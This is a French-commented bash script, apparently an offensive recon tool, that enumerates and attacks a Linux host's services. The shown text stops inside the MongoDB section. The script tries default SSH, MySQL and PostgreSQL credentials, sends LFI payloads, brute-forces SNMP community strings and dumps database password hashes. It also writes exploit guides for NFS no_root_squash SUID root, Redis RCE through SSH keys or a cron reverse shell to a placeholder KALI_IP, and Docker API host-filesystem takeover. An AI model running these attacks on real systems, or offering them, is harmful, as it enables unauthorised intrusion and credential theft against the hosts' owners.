#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║   Auto-Enum — LINUX MACHINE                                 ║
# ║   Usage: ./enum_linux.sh <TARGET> [USER] [PASS]             ║
# ║   Ex:    ./enum_linux.sh 10.10.10.10                        ║
# ║          ./enum_linux.sh 10.10.10.10 admin password123      ║
# ╚══════════════════════════════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-}"
PASS="${3:-}"

require_target "$TARGET"
banner "LINUX FULL ENUM" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "linux")

# Outil nxc/crackmapexec
NXC=$(command -v nxc 2>/dev/null || command -v crackmapexec 2>/dev/null || echo "")

# ─── 1. FINGERPRINT ────────────────────────────────────────────
section "1. FINGERPRINT LINUX"

# TTL check (indicateur OS)
TTL=$(ping -c 1 -W 2 "$TARGET" 2>/dev/null | grep -oP 'ttl=\K\d+')
if [[ -n "$TTL" ]]; then
    info "TTL : $TTL"
    [[ "$TTL" -le 70 ]] && info "→ Probablement Linux (TTL ~64)"
    [[ "$TTL" -ge 120 ]] && info "→ Probablement Windows (TTL ~128)"
fi

# Nmap OS detection complet
info "Nmap — scan OS + banners"
run "Nmap fingerprint" "$OUTDIR/nmap_fingerprint.txt" \
    nmap -sV -sC -O -p 21,22,25,53,80,111,139,143,443,445,873,2049,3306,5432,6379,8080 \
    --open -oN "$OUTDIR/nmap_fingerprint_raw.txt" "$TARGET"

OS_INFO=$(grep -oP "OS details: \K.+" "$OUTDIR/nmap_fingerprint_raw.txt" 2>/dev/null | head -1)
[[ -n "$OS_INFO" ]] && finding "OS : $OS_INFO"

DISTRO=$(grep -oP "OS CPE: cpe:/o:\K\S+" "$OUTDIR/nmap_fingerprint_raw.txt" 2>/dev/null | head -1)
[[ -n "$DISTRO" ]] && info "Distro CPE : $DISTRO"

# ─── 2. SSH (22) ───────────────────────────────────────────────
section "2. SSH (22)"

nc -w 3 "$TARGET" 22 </dev/null 2>/dev/null || { info "Port 22 fermé — section SSH ignorée"; }

# Version et banner
SSH_BANNER=$(timeout 5 nc -w 3 "$TARGET" 22 2>/dev/null | head -1)
[[ -n "$SSH_BANNER" ]] && {
    info "SSH Banner : $SSH_BANNER"
    SSH_VER=$(echo "$SSH_BANNER" | grep -oP "OpenSSH_\K[\d.p]+")
    [[ -n "$SSH_VER" ]] && finding "OpenSSH version : $SSH_VER"
    echo "$SSH_BANNER" > "$OUTDIR/ssh_banner.txt"
}

# Auth methods disponibles
info "SSH — méthodes d'authentification"
ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=none \
    -o BatchMode=yes "$TARGET" 2>&1 | grep -i "publickey\|password\|keyboard\|auth" | \
    tee "$OUTDIR/ssh_auth_methods.txt"

# Nmap SSH scripts
run "Nmap SSH" "$OUTDIR/nmap_ssh.txt" \
    nmap -p22 --script ssh-auth-methods,ssh-hostkey,sshv1 "$TARGET"

# Weak ciphers (si sshaudit disponible)
if check_tool ssh-audit 2>/dev/null || command -v ssh-audit &>/dev/null; then
    info "ssh-audit — check ciphers faibles"
    timeout 20 ssh-audit "$TARGET" 2>&1 | grep -E "warn|fail|crit" | \
        tee "$OUTDIR/ssh_audit.txt"
fi

# Default creds
DEFAULT_SSH_CREDS=("root:root" "root:toor" "admin:admin" "pi:raspberry" "ubuntu:ubuntu" "kali:kali" "vagrant:vagrant")
for CRED in "${DEFAULT_SSH_CREDS[@]}"; do
    _u="${CRED%%:*}"; _p="${CRED##*:}"
    RESULT=$(timeout 5 sshpass -p "$_p" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o BatchMode=no \
        "$_u@$TARGET" "whoami" 2>&1)
    if echo "$RESULT" | grep -qvE "denied|failed|error|timed|Warning"; then
        success "SSH DEFAULT CREDS : $_u:$_p"
        echo "SSH:$_u:$_p" >> "$OUTDIR/valid_creds.txt"
        finding "SSH_DEFAULT_CREDS:$_u:$_p"
        echo "SSH_DEFAULT_CREDS:$_u:$_p" >> "$OUTDIR/findings.txt"
        break
    fi
done

# Avec creds fournis
if [[ -n "$USER" && -n "$PASS" ]]; then
    info "Test SSH avec creds fournis"
    RESULT=$(timeout 5 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 "$USER@$TARGET" "whoami && id" 2>&1)
    echo "$RESULT" | tee "$OUTDIR/ssh_auth_test.txt"
    echo "$RESULT" | grep -qvE "denied|failed|error|timed|Warning" && {
        success "SSH AUTH OK : $USER@$TARGET"
        echo "SSH:$USER:$PASS" >> "$OUTDIR/valid_creds.txt"
    }
fi

# ─── 3. FTP (21) ───────────────────────────────────────────────
section "3. FTP (21)"

nc -w 3 "$TARGET" 21 </dev/null 2>/dev/null || { info "Port 21 fermé — section FTP ignorée"; }

# Banner
FTP_BANNER=$(timeout 5 nc -w 3 "$TARGET" 21 2>/dev/null | head -1)
[[ -n "$FTP_BANNER" ]] && { info "FTP Banner : $FTP_BANNER"; echo "$FTP_BANNER" > "$OUTDIR/ftp_banner.txt"; }

# Anonymous login
info "Test FTP anonyme"
FTP_ANON=$(timeout 10 ftp -n "$TARGET" <<'FTPCMDS' 2>&1
user anonymous anonymous
pwd
ls
quit
FTPCMDS
)
echo "$FTP_ANON" | tee "$OUTDIR/ftp_anon.txt"

if echo "$FTP_ANON" | grep -q "230\|Login successful"; then
    success "FTP ANONYME AUTORISÉ !"
    finding "FTP_ANONYMOUS" >> "$OUTDIR/findings.txt"
    echo "FTP:anonymous:anonymous" >> "$OUTDIR/valid_creds.txt"

    # Lister et télécharger les fichiers
    info "Téléchargement des fichiers FTP"
    mkdir -p "$OUTDIR/ftp_files"
    timeout 30 wget -r -np -nH --no-verbose \
        "ftp://anonymous:anonymous@$TARGET/" \
        -P "$OUTDIR/ftp_files/" 2>&1 | tee "$OUTDIR/ftp_download.txt"

    # Check upload
    echo "test_upload_$(date +%s)" > /tmp/ftp_test_upload.txt
    FTP_UPLOAD=$(timeout 5 ftp -n "$TARGET" <<'FTPCMDS' 2>&1
user anonymous anonymous
put /tmp/ftp_test_upload.txt
quit
FTPCMDS
)
    echo "$FTP_UPLOAD" | grep -qi "226\|Transfer complete\|success" && {
        warning "FTP UPLOAD POSSIBLE en anonyme !"
        echo "FTP_UPLOAD_ANON" >> "$OUTDIR/findings.txt"
    }
    rm -f /tmp/ftp_test_upload.txt
fi

# Avec creds
if [[ -n "$USER" && -n "$PASS" ]]; then
    info "FTP — test avec creds"
    timeout 10 ftp -n "$TARGET" <<EOF 2>&1 | tee "$OUTDIR/ftp_auth.txt"
user $USER $PASS
pwd
ls -la
quit
EOF
fi

# Nmap FTP scripts
nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor "$TARGET" 2>/dev/null | \
    tee "$OUTDIR/nmap_ftp.txt"
grep -qi "VULNERABLE\|backdoor\|Anonymous" "$OUTDIR/nmap_ftp.txt" 2>/dev/null && \
    grep -oP "\[.*VULNERABLE.*\]" "$OUTDIR/nmap_ftp.txt" >> "$OUTDIR/findings.txt"

# ─── 4. WEB (80/443/8080...) ───────────────────────────────────
section "4. WEB"

# Détecter tous les ports HTTP
HTTP_PORTS=$(nmap -p 80,443,8000,8080,8443,8888,9090,9200 --open -T4 "$TARGET" 2>/dev/null | \
    grep -oP '\d+(?=/tcp\s+open\s+https?)' | tr '\n' ' ')
[[ -z "$HTTP_PORTS" ]] && HTTP_PORTS="80 443"

for PORT_WEB in $HTTP_PORTS; do
    nc -w 2 "$TARGET" "$PORT_WEB" </dev/null 2>/dev/null || continue
    PROTO="http"; [[ "$PORT_WEB" == "443" || "$PORT_WEB" == "8443" ]] && PROTO="https"
    WEB_DIR="$OUTDIR/web_$PORT_WEB"; mkdir -p "$WEB_DIR"

    info "Web enum ${PROTO}://$TARGET:$PORT_WEB"

    # Headers + banner
    curl -sIL --max-time 10 "${PROTO}://${TARGET}:${PORT_WEB}" 2>/dev/null | \
        tee "$WEB_DIR/headers.txt"

    # robots.txt
    curl -s --max-time 8 "${PROTO}://${TARGET}:${PORT_WEB}/robots.txt" 2>/dev/null | \
        grep -v "^#\|^$" | tee "$WEB_DIR/robots.txt"

    # Whatweb
    check_tool whatweb && timeout 20 whatweb -a 3 "${PROTO}://${TARGET}:${PORT_WEB}" 2>&1 | \
        tee "$WEB_DIR/whatweb.txt"

    # SSL cert SANs
    if [[ "$PROTO" == "https" ]]; then
        openssl s_client -connect "${TARGET}:${PORT_WEB}" 2>/dev/null </dev/null | \
            openssl x509 -noout -text 2>/dev/null | \
            grep -A 5 "Subject Alternative" | tee "$WEB_DIR/ssl_san.txt"
        grep -oP "DNS:\K[^,]+" "$WEB_DIR/ssl_san.txt" 2>/dev/null | \
            tee "$WEB_DIR/subdomains_ssl.txt"
    fi

    # LFI rapide
    info "LFI test rapide"
    for LFI_PATH in "../../../etc/passwd" "....//....//....//etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"; do
        RESULT=$(curl -s --max-time 8 "${PROTO}://${TARGET}:${PORT_WEB}/?file=${LFI_PATH}" 2>/dev/null)
        if echo "$RESULT" | grep -q "root:x:0:0"; then
            success "LFI TROUVÉ : /?file=$LFI_PATH"
            echo "$RESULT" | tee "$WEB_DIR/lfi_exploit.txt"
            echo "LFI:$PORT_WEB:file=$LFI_PATH" >> "$OUTDIR/findings.txt"
            break
        fi
    done

    # Nikto
    if check_tool nikto; then
        info "nikto scan"
        timeout 90 nikto -h "${PROTO}://${TARGET}:${PORT_WEB}" \
            -output "$WEB_DIR/nikto.txt" 2>&1 | tail -5
    fi

    # Directory fuzzing
    WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
    [[ ! -f "$WORDLIST" ]] && WORDLIST="/usr/share/wordlists/dirb/common.txt"

    if check_tool ffuf && [[ -f "$WORDLIST" ]]; then
        info "ffuf — fuzzing + extensions Linux"
        run_long "ffuf $PORT_WEB" "$WEB_DIR/ffuf.txt" 90 \
            ffuf -u "${PROTO}://${TARGET}:${PORT_WEB}/FUZZ" \
            -w "$WORDLIST" \
            -e ".php,.txt,.bak,.old,.zip,.tar.gz,.sql,.html,.sh,.py" \
            -mc 200,201,301,302,403 -t 40 -s
    elif check_tool gobuster && [[ -f "$WORDLIST" ]]; then
        run_long "gobuster $PORT_WEB" "$WEB_DIR/gobuster.txt" 90 \
            gobuster dir -u "${PROTO}://${TARGET}:${PORT_WEB}" \
            -w "$WORDLIST" -x php,txt,bak,old,zip,html,sh --no-error -q
    fi

    # CMS detection
    CMS=""
    if grep -qi "wordpress\|wp-content\|wp-login" "$WEB_DIR/whatweb.txt" "$WEB_DIR/headers.txt" 2>/dev/null; then
        CMS="WordPress"
    elif grep -qi "drupal" "$WEB_DIR/whatweb.txt" 2>/dev/null; then
        CMS="Drupal"
    elif grep -qi "joomla" "$WEB_DIR/whatweb.txt" 2>/dev/null; then
        CMS="Joomla"
    fi

    [[ -n "$CMS" ]] && {
        finding "CMS détecté : $CMS sur $PORT_WEB"
        echo "CMS:$CMS:$PORT_WEB" >> "$OUTDIR/findings.txt"
        if [[ "$CMS" == "WordPress" ]] && check_tool wpscan; then
            info "wpscan — WordPress scan"
            run_long "wpscan $PORT_WEB" "$WEB_DIR/wpscan.txt" 120 \
                wpscan --url "${PROTO}://${TARGET}:${PORT_WEB}" \
                --enumerate ap,u --no-banner 2>&1
        fi
    }
done

# ─── 5. SMB / SAMBA (445) ──────────────────────────────────────
section "5. SMB / SAMBA (445)"

nc -w 3 "$TARGET" 445 </dev/null 2>/dev/null || { info "Port 445 fermé — section SMB ignorée"; }

# Fingerprint
[[ -n "$NXC" ]] && $NXC smb "$TARGET" 2>&1 | tee "$OUTDIR/smb_fingerprint.txt"

# Null/guest session
info "SMB — null/guest session"
smbclient -L "//$TARGET" -N 2>&1 | tee "$OUTDIR/smb_null.txt"
[[ -n "$NXC" ]] && {
    $NXC smb "$TARGET" -u '' -p '' --shares 2>&1 | tee "$OUTDIR/smb_null_nxc.txt"
    $NXC smb "$TARGET" -u 'guest' -p '' --shares 2>&1 | tee "$OUTDIR/smb_guest_nxc.txt"
}

# smbmap
if check_tool smbmap; then
    smbmap -H "$TARGET" 2>&1 | tee "$OUTDIR/smbmap.txt"
    [[ -n "$USER" ]] && smbmap -H "$TARGET" -u "$USER" -p "$PASS" 2>&1 | \
        tee "$OUTDIR/smbmap_auth.txt"
fi

# Avec creds
[[ -n "$USER" && -n "$NXC" ]] && {
    $NXC smb "$TARGET" -u "$USER" -p "$PASS" --shares 2>&1 | tee "$OUTDIR/smb_auth.txt"
}

# EternalBlue (peut toucher des Samba vulnérables aussi)
nmap -p445 --script smb-vuln-ms17-010 "$TARGET" 2>/dev/null | \
    tee "$OUTDIR/smb_vuln.txt" | grep -i "VULNERABLE" && \
    echo "MS17-010" >> "$OUTDIR/findings.txt"

# ─── 6. NFS (2049) ─────────────────────────────────────────────
section "6. NFS (2049)"

nc -w 3 "$TARGET" 111 </dev/null 2>/dev/null || nc -w 3 "$TARGET" 2049 </dev/null 2>/dev/null || \
    { info "Ports 111/2049 fermés — section NFS ignorée"; }

info "showmount — exports NFS"
showmount -e "$TARGET" 2>&1 | tee "$OUTDIR/nfs_exports.txt"

if grep -v "^Export\|^Exports\|^#" "$OUTDIR/nfs_exports.txt" 2>/dev/null | grep -q "/"; then
    finding "EXPORTS NFS TROUVÉS !"
    echo "NFS_EXPORTS" >> "$OUTDIR/findings.txt"

    # Monter chaque export
    while read -r EXPORT _rest; do
        [[ -z "$EXPORT" || "$EXPORT" == "Export" ]] && continue
        MOUNTPOINT="/mnt/nfs_$(echo "$EXPORT" | tr '/' '_')_$$"
        info "Montage de $TARGET:$EXPORT"
        sudo mkdir -p "$MOUNTPOINT" 2>/dev/null
        if sudo mount -t nfs "$TARGET:$EXPORT" "$MOUNTPOINT" -o vers=3,nolock 2>/dev/null || \
           sudo mount -t nfs "$TARGET:$EXPORT" "$MOUNTPOINT" -o vers=4,nolock 2>/dev/null; then
            success "Monté : $MOUNTPOINT"
            ls -la "$MOUNTPOINT" 2>/dev/null | tee "$OUTDIR/nfs_$(basename "$EXPORT").txt"

            # Chercher fichiers sensibles
            find "$MOUNTPOINT" -type f \( -name "*.txt" -o -name "*.conf" -o -name "*.key" \
                -o -name "authorized_keys" -o -name "id_rsa" -o -name "*.bak" \) 2>/dev/null | \
                head -20 | tee -a "$OUTDIR/nfs_interesting.txt"

            # Vérifier no_root_squash (tenter créer fichier SUID)
            OWNER=$(ls -lan "$MOUNTPOINT" 2>/dev/null | awk 'NR==2{print $3}')
            [[ "$OWNER" == "0" ]] && {
                success "no_root_squash PROBABLE (owned by uid 0) !"
                finding "NFS_NO_ROOT_SQUASH:$EXPORT"
                echo "NFS_NO_ROOT_SQUASH:$EXPORT" >> "$OUTDIR/findings.txt"
                cat >> "$OUTDIR/nfs_exploit_guide.txt" << EOF
# EXPLOIT no_root_squash sur $EXPORT
# Depuis Kali (en root) :
sudo cp /bin/bash $MOUNTPOINT/bash
sudo chmod u+s $MOUNTPOINT/bash
# Sur la cible :
./bash -p   # → uid=0(root)

# OU : ajouter clé SSH
# Kali: sudo cp ~/.ssh/id_rsa.pub $MOUNTPOINT/root/.ssh/authorized_keys
# Cible: ssh root@CIBLE
EOF
            }
            sudo umount "$MOUNTPOINT" 2>/dev/null
            sudo rmdir "$MOUNTPOINT" 2>/dev/null
        else
            warn "Impossible de monter $EXPORT"
        fi
    done < <(grep "^/" "$OUTDIR/nfs_exports.txt" 2>/dev/null)
fi

# ─── 7. SMTP (25/587) ──────────────────────────────────────────
section "7. SMTP (25/587)"

for SMTP_PORT in 25 587; do
    nc -w 3 "$TARGET" "$SMTP_PORT" </dev/null 2>/dev/null || continue
    info "SMTP enum sur port $SMTP_PORT"

    # Banner
    SMTP_BANNER=$(timeout 5 nc -w 3 "$TARGET" "$SMTP_PORT" 2>/dev/null | head -1)
    [[ -n "$SMTP_BANNER" ]] && { info "SMTP Banner : $SMTP_BANNER"; }

    # EHLO pour capabilities
    echo -e "EHLO test\nQUIT" | timeout 5 nc "$TARGET" "$SMTP_PORT" 2>/dev/null | \
        tee "$OUTDIR/smtp_ehlo_$SMTP_PORT.txt"

    # VRFY / RCPT user enum
    if check_tool smtp-user-enum; then
        info "smtp-user-enum — VRFY"
        ULIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
        [[ -f "$ULIST" ]] && run_long "smtp-user-enum $SMTP_PORT" \
            "$OUTDIR/smtp_users_$SMTP_PORT.txt" 60 \
            smtp-user-enum -M VRFY -U "$ULIST" -t "$TARGET" -p "$SMTP_PORT"
    else
        # Fallback nmap
        nmap -p"$SMTP_PORT" --script smtp-enum-users,smtp-open-relay \
            --script-args "smtp-enum-users.methods=VRFY,RCPT,EXPN" \
            "$TARGET" 2>/dev/null | tee "$OUTDIR/nmap_smtp_$SMTP_PORT.txt"
    fi

    # Mail relay test
    RELAY_TEST=$(echo -e "EHLO test\nMAIL FROM:<test@test.com>\nRCPT TO:<test@google.com>\nQUIT" | \
        timeout 5 nc "$TARGET" "$SMTP_PORT" 2>/dev/null)
    echo "$RELAY_TEST" | grep -q "250" && {
        warning "OPEN RELAY possible sur port $SMTP_PORT !"
        echo "SMTP_OPEN_RELAY:$SMTP_PORT" >> "$OUTDIR/findings.txt"
    }
done

# ─── 8. SNMP (161 UDP) ─────────────────────────────────────────
section "8. SNMP (161 UDP)"

# Vérifier port UDP 161 (scan rapide)
SNMP_OPEN=$(timeout 5 sudo nmap -sU -p161 --open "$TARGET" 2>/dev/null | grep "161/udp.*open ")
[[ -z "$SNMP_OPEN" ]] && { info "SNMP port 161 UDP non confirmé"; }

# Community string bruteforce
if check_tool onesixtyone; then
    info "onesixtyone — community string bruteforce"
    COMMUNITY_LIST="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
    [[ ! -f "$COMMUNITY_LIST" ]] && COMMUNITY_LIST="/usr/share/seclists/Discovery/SNMP/snmp.txt"
    [[ -f "$COMMUNITY_LIST" ]] && \
        onesixtyone -c "$COMMUNITY_LIST" "$TARGET" 2>&1 | tee "$OUTDIR/snmp_community.txt"
fi

# Fallback : tester manuellement les strings courantes
COMMUNITY_FOUND=""
for COMM in "public" "private" "community" "manager" "admin" "snmpd" "cisco" "default"; do
    RESULT=$(timeout 3 snmpget -v2c -c "$COMM" "$TARGET" sysDescr.0 2>/dev/null)
    if [[ -n "$RESULT" ]] && ! echo "$RESULT" | grep -q "Timeout\|Error"; then
        success "Community string valide : $COMM"
        COMMUNITY_FOUND="$COMM"
        echo "$COMM" >> "$OUTDIR/snmp_valid_communities.txt"
        echo "SNMP_COMMUNITY:$COMM" >> "$OUTDIR/findings.txt"
        break
    fi
done

# Si community trouvée → dump infos
if [[ -z "$COMMUNITY_FOUND" ]] && [[ -s "$OUTDIR/snmp_community.txt" ]]; then
    COMMUNITY_FOUND=$(grep -v "^Scanning\|^$" "$OUTDIR/snmp_community.txt" | \
        awk '{print $NF}' | head -1 | tr -d '[]')
fi

if [[ -n "$COMMUNITY_FOUND" ]]; then
    info "snmpwalk — dump infos avec community '$COMMUNITY_FOUND'"
    snmpwalk -v2c -c "$COMMUNITY_FOUND" "$TARGET" 2>/dev/null | tee "$OUTDIR/snmp_walk.txt" | head -50

    # Infos clés
    snmpwalk -v2c -c "$COMMUNITY_FOUND" "$TARGET" 1.3.6.1.2.1.25.4.2.1.2 2>/dev/null | \
        tee "$OUTDIR/snmp_processes.txt"
    snmpwalk -v2c -c "$COMMUNITY_FOUND" "$TARGET" 1.3.6.1.2.1.25.6.3.1.2 2>/dev/null | \
        tee "$OUTDIR/snmp_installed.txt"
    snmpwalk -v2c -c "$COMMUNITY_FOUND" "$TARGET" 1.3.6.1.2.1.1.5.0 2>/dev/null | \
        tee "$OUTDIR/snmp_hostname.txt"

    # Chercher credentials dans les processus
    grep -iE "password|pass=|pwd=|token|secret|apikey" "$OUTDIR/snmp_processes.txt" 2>/dev/null && \
        finding "CREDS POSSIBLE DANS PROCESSUS SNMP !"
fi

# ─── 9. REDIS (6379) ───────────────────────────────────────────
section "9. REDIS (6379)"

nc -w 3 "$TARGET" 6379 </dev/null 2>/dev/null || { info "Port 6379 fermé — Redis ignoré"; }

info "Redis — test accès non authentifié"
REDIS_INFO=$(echo -e "PING\r\nINFO server\r\nQUIT\r\n" | timeout 5 nc -w 3 "$TARGET" 6379 2>/dev/null)
echo "$REDIS_INFO" | tee "$OUTDIR/redis_info.txt"

if echo "$REDIS_INFO" | grep -qi "PONG\|redis_version"; then
    success "REDIS ACCESSIBLE SANS AUTH !"
    finding "REDIS_NOAUTH" >> "$OUTDIR/findings.txt"
    echo "REDIS:noauth" >> "$OUTDIR/valid_creds.txt"

    REDIS_VER=$(echo "$REDIS_INFO" | grep -oP "redis_version:\K\S+")
    [[ -n "$REDIS_VER" ]] && finding "Redis version : $REDIS_VER"

    # Enum keys
    REDIS_KEYS=$(echo -e "KEYS *\r\nQUIT\r\n" | timeout 5 nc -w 3 "$TARGET" 6379 2>/dev/null)
    echo "$REDIS_KEYS" | tee "$OUTDIR/redis_keys.txt"

    # Guide RCE via Redis
    cat >> "$OUTDIR/redis_rce_guide.txt" << 'EOF'
# Redis RCE via SSH authorized_keys (si Redis tourne en root)
redis-cli -h TARGET flushall
redis-cli -h TARGET config set dir /root/.ssh/
redis-cli -h TARGET config set dbfilename authorized_keys
echo -e "\n\n" > /tmp/foo.txt
cat ~/.ssh/id_rsa.pub >> /tmp/foo.txt
echo -e "\n\n" >> /tmp/foo.txt
redis-cli -h TARGET -x set authkey < /tmp/foo.txt
redis-cli -h TARGET save
ssh -i ~/.ssh/id_rsa root@TARGET

# Redis RCE via cron (si Redis pas en root mais peut écrire /var/spool/cron)
redis-cli -h TARGET config set dir /var/spool/cron/
redis-cli -h TARGET config set dbfilename root
redis-cli -h TARGET set cron "\n\n*/1 * * * * bash -i >& /dev/tcp/KALI_IP/4444 0>&1\n\n"
redis-cli -h TARGET save
EOF
fi

# ─── 10. MYSQL (3306) ──────────────────────────────────────────
section "10. MYSQL (3306)"

nc -w 3 "$TARGET" 3306 </dev/null 2>/dev/null || { info "Port 3306 fermé — MySQL ignoré"; }

# Banner
MYSQL_BANNER=$(timeout 5 nc -w 3 "$TARGET" 3306 2>/dev/null | strings | head -1)
[[ -n "$MYSQL_BANNER" ]] && { info "MySQL Banner : $MYSQL_BANNER"; echo "$MYSQL_BANNER" > "$OUTDIR/mysql_banner.txt"; }

# Default creds
if command -v mysql &>/dev/null; then
    for CRED in "root:" "root:root" "root:mysql" "root:toor" "root:password" "root:Password1" "admin:admin"; do
        _u="${CRED%%:*}"; _p="${CRED##*:}"
        RESULT=$(timeout 5 mysql -h "$TARGET" -u "$_u" ${_p:+-p$_p} \
            -e "SHOW DATABASES;" 2>&1)
        if echo "$RESULT" | grep -q "Database\|information_schema"; then
            success "MySQL DEFAULT CREDS : $_u:${_p:-<empty>}"
            echo "$RESULT" | tee "$OUTDIR/mysql_databases.txt"
            echo "MYSQL:$_u:${_p}" >> "$OUTDIR/valid_creds.txt"
            echo "MYSQL_ACCESS:$_u" >> "$OUTDIR/findings.txt"
            # Chercher tables users
            mysql -h "$TARGET" -u "$_u" ${_p:+-p$_p} \
                -e "SELECT user,password,plugin FROM mysql.user;" 2>/dev/null | \
                tee "$OUTDIR/mysql_users.txt"
            break
        fi
    done
fi

# ─── 11. POSTGRESQL (5432) ─────────────────────────────────────
section "11. POSTGRESQL (5432)"

nc -w 3 "$TARGET" 5432 </dev/null 2>/dev/null || { info "Port 5432 fermé — PostgreSQL ignoré"; }

if command -v psql &>/dev/null; then
    for CRED in "postgres:postgres" "postgres:" "postgres:password" "admin:admin"; do
        _u="${CRED%%:*}"; _p="${CRED##*:}"
        RESULT=$(timeout 5 PGPASSWORD="$_p" psql -h "$TARGET" -U "$_u" \
            -c "\l" 2>&1)
        if echo "$RESULT" | grep -q "List of databases\|postgres"; then
            success "PostgreSQL CREDS : $_u:${_p:-<empty>}"
            echo "$RESULT" | tee "$OUTDIR/pg_databases.txt"
            echo "POSTGRES:$_u:${_p}" >> "$OUTDIR/valid_creds.txt"
            echo "POSTGRES_ACCESS:$_u" >> "$OUTDIR/findings.txt"
            break
        fi
    done
fi

# ─── 12. RSYNC (873) ───────────────────────────────────────────
section "12. RSYNC (873)"

nc -w 3 "$TARGET" 873 </dev/null 2>/dev/null || { info "Port 873 fermé — rsync ignoré"; }

info "rsync — listing des modules"
RSYNC_MODULES=$(timeout 5 nc -w 3 "$TARGET" 873 2>/dev/null <<< "" | head -20)
echo "$RSYNC_MODULES" | tee "$OUTDIR/rsync_modules_raw.txt"

# rsync --list-only
rsync --list-only "rsync://$TARGET/" 2>/dev/null | tee "$OUTDIR/rsync_modules.txt"

if [[ -s "$OUTDIR/rsync_modules.txt" ]]; then
    finding "MODULES RSYNC TROUVÉS !"
    echo "RSYNC_MODULES" >> "$OUTDIR/findings.txt"

    # Essayer d'accéder à chaque module
    while read -r _perm _size _date _time MODULE _rest; do
        [[ -z "$MODULE" ]] && continue
        info "rsync — enum module : $MODULE"
        rsync --list-only "rsync://$TARGET/$MODULE/" 2>/dev/null | \
            tee "$OUTDIR/rsync_${MODULE}.txt" | head -20

        [[ -s "$OUTDIR/rsync_${MODULE}.txt" ]] && {
            success "Accès anonyme au module $MODULE !"
            echo "RSYNC_ANON_ACCESS:$MODULE" >> "$OUTDIR/findings.txt"

            # Chercher fichiers sensibles
            rsync --list-only -r "rsync://$TARGET/$MODULE/" 2>/dev/null | \
                grep -iE "\.key|\.pem|\.bak|id_rsa|passwd|shadow|config|\.sql" | \
                head -10 | tee "$OUTDIR/rsync_${MODULE}_interesting.txt"
        }
    done < "$OUTDIR/rsync_modules.txt"
fi

# ─── 13. DOCKER API (2375/2376) ────────────────────────────────
section "13. DOCKER API (2375/2376)"

for DOCKER_PORT in 2375 2376; do
    nc -w 2 "$TARGET" "$DOCKER_PORT" </dev/null 2>/dev/null || continue
    PROTO_D="http"; [[ "$DOCKER_PORT" == "2376" ]] && PROTO_D="https"

    info "Docker API — test accès non authentifié sur $DOCKER_PORT"
    DOCKER_INFO=$(curl -s --max-time 8 "${PROTO_D}://${TARGET}:${DOCKER_PORT}/info" 2>/dev/null)
    echo "$DOCKER_INFO" | tee "$OUTDIR/docker_info_$DOCKER_PORT.txt" | \
        python3 -m json.tool 2>/dev/null | head -20

    if [[ -n "$DOCKER_INFO" ]] && ! echo "$DOCKER_INFO" | grep -q "404\|connection refused"; then
        success "DOCKER API ACCESSIBLE SANS AUTH (port $DOCKER_PORT) → RCE POSSIBLE !"
        finding "DOCKER_API_NOAUTH:$DOCKER_PORT"
        echo "DOCKER_API:$DOCKER_PORT" >> "$OUTDIR/findings.txt"

        curl -s --max-time 8 "${PROTO_D}://${TARGET}:${DOCKER_PORT}/containers/json" 2>/dev/null | \
            python3 -m json.tool 2>/dev/null | tee "$OUTDIR/docker_containers_$DOCKER_PORT.txt"

        cat >> "$OUTDIR/docker_rce_guide.txt" << EOF
# Docker API RCE (port $DOCKER_PORT)
# Créer un container avec mount du FS root
curl -sX POST -H "Content-Type: application/json" \\
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /mnt/etc/shadow"],"Mounts":[{"Target":"/mnt","Source":"/","Type":"bind","ReadWrite":true}]}' \\
  http://$TARGET:$DOCKER_PORT/containers/create?name=pwn
curl -sX POST http://$TARGET:$DOCKER_PORT/containers/pwn/start
curl -sX GET "http://$TARGET:$DOCKER_PORT/containers/pwn/logs?stdout=1"
EOF
    fi
done

# ─── 14. ELASTICSEARCH (9200) ──────────────────────────────────
section "14. ELASTICSEARCH (9200)"

nc -w 2 "$TARGET" 9200 </dev/null 2>/dev/null || { info "Port 9200 fermé — ES ignoré"; }

ELASTIC_ROOT=$(curl -s --max-time 8 "http://$TARGET:9200/" 2>/dev/null)
if echo "$ELASTIC_ROOT" | grep -qi "elasticsearch\|tagline"; then
    success "ELASTICSEARCH ACCESSIBLE SANS AUTH !"
    echo "$ELASTIC_ROOT" | python3 -m json.tool 2>/dev/null | tee "$OUTDIR/elastic_root.txt" | head -20
    finding "ELASTICSEARCH_NOAUTH"
    echo "ELASTICSEARCH_NOAUTH" >> "$OUTDIR/findings.txt"

    # Lister les indices
    curl -s --max-time 8 "http://$TARGET:9200/_cat/indices?v" 2>/dev/null | \
        tee "$OUTDIR/elastic_indices.txt"

    # Chercher un index qui contient des données sensibles
    INDICES=$(grep -oP "yellow\s+open\s+\K\S+" "$OUTDIR/elastic_indices.txt" 2>/dev/null | head -5)
    for IDX in $INDICES; do
        [[ "$IDX" == "." ]] && continue
        info "Dump index : $IDX"
        curl -s --max-time 10 "http://$TARGET:9200/$IDX/_search?pretty&size=3" 2>/dev/null | \
            tee "$OUTDIR/elastic_${IDX}_sample.txt" | head -40
    done
fi

# ─── 15. MONGODB (27017) ───────────────────────────────────────
section "15. MONGODB (27017)"

nc -w 2 "$TARGET" 27017 </dev/null 2>/dev/null || { info "Port 27017 fermé — MongoDB ignoré"; }

MONGO_BANNER=$(timeout 3 nc -w 2 "$TARGET" 27017 2>/dev/null | strings | head -3)
[[ -n "$MONGO_BANNER" ]] && { info "MongoDB Banner : $MONGO_BANNER"; echo "$MONGO_BANNER" > "$OUTDIR/mongo_banner.txt"; }

if command -v mongosh &>/dev/null || command -v mongo &>/dev/null; then
    MONGO_CLI=$(command -v mongosh 2>/dev/null || command -v mongo 2>/dev/null)
    info "MongoDB — test accès non authentifié"
    MONGO_DBS=$(timeout 5 $MONGO_CLI --host "$TARGET" --quiet \
        --eval "db.adminCommand({listDatabases: 1})" 2>/dev/null)
